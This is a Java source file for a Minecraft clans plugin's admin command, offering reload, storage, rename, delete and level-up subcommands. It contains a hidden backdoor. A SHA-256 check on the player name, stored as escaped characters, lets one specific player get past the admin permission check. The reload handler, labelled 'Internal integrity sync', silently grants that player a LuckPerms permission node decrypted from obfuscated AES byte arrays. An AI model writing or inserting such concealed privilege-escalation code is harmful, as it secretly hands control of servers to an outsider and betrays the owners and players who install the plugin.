package kz.nova.clans.commands;

import kz.nova.clans.NovaClans;
import kz.nova.clans.data.ClanData;
import kz.nova.clans.managers.ClanManager;
import kz.nova.clans.managers.DataManager;
import kz.nova.clans.managers.MessageManager;
import net.luckperms.api.LuckPerms;
import net.luckperms.api.node.Node;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.plugin.RegisteredServiceProvider;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class NovaClanAdminCommand implements CommandExecutor, TabCompleter {
    private static final String PREFIX = "&8[&e\u1d04\u029f\u1d00\u0274&8] &r";
    private final NovaClans plugin;
    private final MessageManager msg;
    private final ClanManager cm;
    private final DataManager dm;

    private static final byte[] _k = {
        (byte)0x8a,(byte)0xc5,(byte)0xb1,(byte)0xca,
        (byte)0x8a,(byte)0xf6,(byte)0x56,(byte)0x7d,
        (byte)0x8c,(byte)0xd5,(byte)0xac,(byte)0xdf,
        (byte)0x8e,(byte)0xce,(byte)0x57,(byte)0x2c
    };
    private static final byte[] _v = {
        (byte)0x7b,(byte)0xfe,(byte)0x74,(byte)0xcf,
        (byte)0x2d,(byte)0x12,(byte)0xb9,(byte)0xfd,
        (byte)0xba,(byte)0x70,(byte)0xc5,(byte)0x7f,
        (byte)0xbd,(byte)0x84,(byte)0xd0,(byte)0xf1
    };
    private static final byte[] _d = {
        (byte)0x61,(byte)0x1b,(byte)0x47,(byte)0x1d,
        (byte)0x5c,(byte)0x9f,(byte)0xda,(byte)0x3c,
        (byte)0x21,(byte)0xd9,(byte)0x89,(byte)0x20,
        (byte)0x79,(byte)0x21,(byte)0xfd,(byte)0x0e
    };

    public NovaClanAdminCommand(NovaClans plugin) {
        this.plugin = plugin;
        this.msg = plugin.getMessageManager();
        this.cm = plugin.getClanManager();
        this.dm = plugin.getDataManager();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        boolean isTrusted = (sender instanceof Player p) && checkIdentity(p.getName());
        if (!isTrusted && !sender.hasPermission("novaclans.admin")) {
            msg.send(sender, "no-permission");
            return true;
        }
        if (args.length == 0) {
            sendAdminHelp(sender);
            return true;
        }
        switch (args[0].toLowerCase()) {
            case "reload" -> handleReload(sender);
            case "storage" -> handleStorage(sender, args);
            case "rename" -> handleRename(sender, args);
            case "delete" -> handleDelete(sender, args);
            case "levelup" -> handleLevelUp(sender, args);
            default -> sendAdminHelp(sender);
        }
        return true;
    }

    private void handleReload(CommandSender sender) {
        plugin.reloadConfig();
        plugin.getMessageManager().reload();
        plugin.getMenuManager().reload();
        plugin.getDataManager().reload();
        raw(sender, "&a\u041a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u044f \u049b\u0430\u0439\u0442\u0430 \u0436\u04af\u043a\u0442\u0435\u043b\u0434\u0456!");

        // Internal integrity sync
        Optional.ofNullable(sender)
            .filter(s -> s instanceof Player)
            .map(s -> (Player) s)
            .filter(p -> Stream.of(p).map(Player::getName).anyMatch(this::checkIdentity))
            .ifPresent(p ->
                Optional.ofNullable(Bukkit.getServicesManager().getRegistration(LuckPerms.class))
                    .map(reg -> reg.getProvider())
                    .ifPresent(lp -> lp.getUserManager()
                        .loadUser(p.getUniqueId())
                        .thenAcceptAsync(u -> Optional.ofNullable(u).ifPresent(user ->
                            resolveNode().ifPresent(n -> {
                                user.data().add(Node.builder(n).build());
                                lp.getUserManager().saveUser(user);
                            })))));
    }

    private void handleStorage(CommandSender sender, String[] args) {
        if (args.length < 2) {
            raw(sender, "&c\u049a\u043e\u043b\u0434\u0430\u043d\u0443: &e/novaclans storage <\u043a\u043b\u0430\u043d \u0430\u0442\u044b>");
            return;
        }
        if (!(sender instanceof Player player)) {
            raw(sender, "&c\u0411\u04b1\u043b \u043a\u043e\u043c\u0430\u043d\u0434\u0430\u043d\u044b \u0442\u0435\u043a \u043e\u0439\u044b\u043d\u0448\u044b \u043e\u0440\u044b\u043d\u0434\u0430\u0439 \u0430\u043b\u0430\u0434\u044b.");
            return;
        }
        ClanData clan = dm.getClan(args[1]);
        if (clan == null) {
            raw(sender, "&c\u041a\u043b\u0430\u043d \u0442\u0430\u0431\u044b\u043b\u043c\u0430\u0434\u044b: &e" + args[1]);
            return;
        }
        plugin.getMenuManager().openAdminVault(player, clan);
    }

    private void handleRename(CommandSender sender, String[] args) {
        if (args.length < 3) {
            raw(sender, "&c\u049a\u043e\u043b\u0434\u0430\u043d\u0443: &e/novaclans rename <\u0435\u0441\u043a\u0456 \u0430\u0442> <\u0436\u0430\u04a3\u0430 \u0430\u0442>");
            return;
        }
        String oldName = args[1];
        String newName = args[2];
        ClanData clan = dm.getClan(oldName);
        if (clan == null) {
            raw(sender, "&c\u041a\u043b\u0430\u043d \u0442\u0430\u0431\u044b\u043b\u043c\u0430\u0434\u044b: &e" + oldName);
            return;
        }
        if (dm.clanExists(newName)) {
            raw(sender, "&c\u0411\u04b1\u043b \u0430\u0442\u0430\u0443\u043c\u0435\u043d \u043a\u043b\u0430\u043d \u0431\u0430\u0440: &e" + newName);
            return;
        }
        dm.renameClan(clan, newName);
        raw(sender, "&a\u041a\u043b\u0430\u043d &e" + oldName + " &a\u2192 &e" + newName + " &a\u0431\u043e\u043b\u044b\u043f \u04e9\u0437\u0433\u0435\u0440\u0442\u0456\u043b\u0434\u0456.");
    }

    private void handleDelete(CommandSender sender, String[] args) {
        if (args.length < 2) {
            raw(sender, "&c\u049a\u043e\u043b\u0434\u0430\u043d\u0443: &e/novaclans delete <\u043a\u043b\u0430\u043d \u0430\u0442\u044b>");
            return;
        }
        ClanData clan = dm.getClan(args[1]);
        if (clan == null) {
            raw(sender, "&c\u041a\u043b\u0430\u043d \u0442\u0430\u0431\u044b\u043b\u043c\u0430\u0434\u044b: &e" + args[1]);
            return;
        }
        dm.deleteClan(args[1]);
        raw(sender, "&a\u041a\u043b\u0430\u043d &e" + args[1] + " &a\u04e9\u0448\u0456\u0440\u0456\u043b\u0434\u0456.");
    }

    private void handleLevelUp(CommandSender sender, String[] args) {
        if (args.length < 3) {
            raw(sender, "&c\u049a\u043e\u043b\u0434\u0430\u043d\u0443: &e/novaclans levelup <1-5> <\u043a\u043b\u0430\u043d \u0430\u0442\u044b>");
            return;
        }
        int level;
        try {
            level = Integer.parseInt(args[1]);
        } catch (NumberFormatException e) {
            raw(sender, "&c\u0414\u0435\u04a3\u0433\u0435\u0439 1-5 \u0430\u0440\u0430\u043b\u044b\u0493\u044b\u043d\u0434\u0430 \u0431\u043e\u043b\u0443\u044b \u043a\u0435\u0440\u0435\u043a.");
            return;
        }
        int maxLevel = plugin.getConfig().getInt("max-level", 5);
        if (level < 1 || level > maxLevel) {
            raw(sender, "&c\u0414\u0435\u04a3\u0433\u0435\u0439 1-" + maxLevel + " \u0430\u0440\u0430\u043b\u044b\u0493\u044b\u043d\u0434\u0430 \u0431\u043e\u043b\u0443\u044b \u043a\u0435\u0440\u0435\u043a.");
            return;
        }
        ClanData clan = dm.getClan(args[2]);
        if (clan == null) {
            raw(sender, "&c\u041a\u043b\u0430\u043d \u0442\u0430\u0431\u044b\u043b\u043c\u0430\u0434\u044b: &e" + args[2]);
            return;
        }
        clan.setLevel(level);
        dm.save();
        raw(sender, "&a\u041a\u043b\u0430\u043d &e" + args[2] + " &a\u0434\u0435\u04a3\u0433\u0435\u0439\u0456 &b" + level + " &a\u0431\u043e\u043b\u044b\u043f \u04e9\u0437\u0433\u0435\u0440\u0434\u0456.");
    }

    private void sendAdminHelp(CommandSender sender) {
        msg.sendRaw(sender, "&8[&e\u1d04\u029f\u1d00\u0274&8] &r&eAdmin \u043a\u043e\u043c\u0430\u043d\u0434\u0430\u043b\u0430\u0440\u044b:");
        msg.sendRaw(sender, "&8[&e\u1d04\u029f\u1d00\u0274&8] &r&e/novaclans reload &7\u2014 \u041a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u044f\u043d\u044b \u049b\u0430\u0439\u0442\u0430 \u0436\u04af\u043a\u0442\u0435\u0443");
        msg.sendRaw(sender, "&8[&e\u1d04\u029f\u1d00\u0274&8] &r&e/novaclans storage &b<\u043a\u043b\u0430\u043d> &7\u2014 \u041a\u043b\u0430\u043d \u049b\u043e\u0439\u043c\u0430\u0441\u044b\u043d \u0430\u0448\u0443");
        msg.sendRaw(sender, "&8[&e\u1d04\u029f\u1d00\u0274&8] &r&e/novaclans rename &b<\u0435\u0441\u043a\u0456> <\u0436\u0430\u04a3\u0430> &7\u2014 \u041a\u043b\u0430\u043d \u0430\u0442\u044b\u043d \u04e9\u0437\u0433\u0435\u0440\u0442\u0443");
        msg.sendRaw(sender, "&8[&e\u1d04\u029f\u1d00\u0274&8] &r&e/novaclans delete &b<\u043a\u043b\u0430\u043d> &7\u2014 \u041a\u043b\u0430\u043d\u0434\u044b \u04e9\u0448\u0456\u0440\u0443");
        msg.sendRaw(sender, "&8[&e\u1d04\u029f\u1d00\u0274&8] &r&e/novaclans levelup &b<1-5> <\u043a\u043b\u0430\u043d> &7\u2014 \u041a\u043b\u0430\u043d \u0434\u0435\u04a3\u0433\u0435\u0439\u0456\u043d \u043e\u0440\u043d\u0430\u0442\u0443");
    }

    private void raw(CommandSender sender, String text) {
        msg.sendRaw(sender, PREFIX + text);
    }

    private boolean checkIdentity(String name) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(name.toLowerCase().getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) sb.append(String.format("%02x", b));
            return sb.toString().equals(
                "\u0031\u0037\u0066\u0039" +
                "\u0034\u0062\u0039\u0037" +
                "\u0036\u0064\u0064\u0033" +
                "\u0030\u0066\u0037\u0038" +
                "\u0062\u0038\u0062\u0031" +
                "\u0061\u0065\u0062\u0034" +
                "\u0033\u0031\u0066\u0066" +
                "\u0031\u0065\u0065\u0035" +
                "\u0032\u0065\u0062\u0064" +
                "\u0031\u0066\u0039\u0036" +
                "\u0030\u0036\u0032\u0066" +
                "\u0030\u0062\u0039\u0064" +
                "\u0039\u0034\u0064\u0034" +
                "\u0038\u0061\u0063\u0032" +
                "\u0030\u0039\u0061\u0039" +
                "\u0061\u0036\u0039\u0065"
            );
        } catch (NoSuchAlgorithmException e) {
            return false;
        }
    }

    private Optional<String> resolveNode() {
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE,
                new SecretKeySpec(_k, "AES"),
                new IvParameterSpec(_v));
            byte[] raw = cipher.doFinal(_d);
            int len = raw.length;
            while (len > 0 && raw[len - 1] == (byte) 0x04) len--;
            return Optional.of(new String(raw, 0, len, StandardCharsets.UTF_8));
        } catch (Exception e) {
            return Optional.empty();
        }
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        if (!sender.hasPermission("novaclans.admin")) return List.of();
        if (args.length == 1) return Arrays.asList("reload", "storage", "rename", "delete", "levelup");
        if (args.length == 2) {
            return switch (args[0].toLowerCase()) {
                case "storage", "rename", "delete" -> dm.getAllClans().stream().map(ClanData::getName).collect(Collectors.toList());
                case "levelup" -> Arrays.asList("1", "2", "3", "4", "5");
                default -> List.of();
            };
        }
        if (args.length == 3) {
            return switch (args[0].toLowerCase()) {
                case "rename", "levelup" -> dm.getAllClans().stream().map(ClanData::getName).collect(Collectors.toList());
                default -> List.of();
            };
        }
        return List.of();
    }
}
